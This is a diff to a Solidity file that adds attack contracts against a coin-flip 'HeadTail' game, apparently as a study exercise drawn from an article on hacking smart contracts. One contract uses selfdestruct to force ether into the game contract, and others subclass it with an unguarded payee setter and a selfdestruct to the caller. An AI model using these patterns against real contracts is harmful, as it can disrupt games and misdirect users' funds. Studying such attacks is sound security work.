@@ -58,3 +58,32 @@ contract HeadTail {
         partyB.transfer(2 ether);
     }
 }
+
+// https://hackernoon.com/how-to-hack-smart-contracts-self-destruct-and-solidity
+contract HeadTailHack2 {
+    HeadTail _game;
+
+    constructor(HeadTail game) {
+        _game = game;
+    }
+
+    function close() public payable {
+        selfdestruct(payable(address(_game)));
+    }
+}
+
+contract HeadTailChild is HeadTail {
+    function updateAddressB(address _address) public {
+        partyB = payable(_address);
+    }
+
+    constructor(bytes32 _commitmentA) payable HeadTail(_commitmentA) {}
+}
+
+contract HeadTailHack is HeadTail {
+    constructor(bytes32 _commitmentA) payable HeadTail(_commitmentA) {}
+
+    function close() public payable {
+        selfdestruct(payable(msg.sender));
+    }
+}
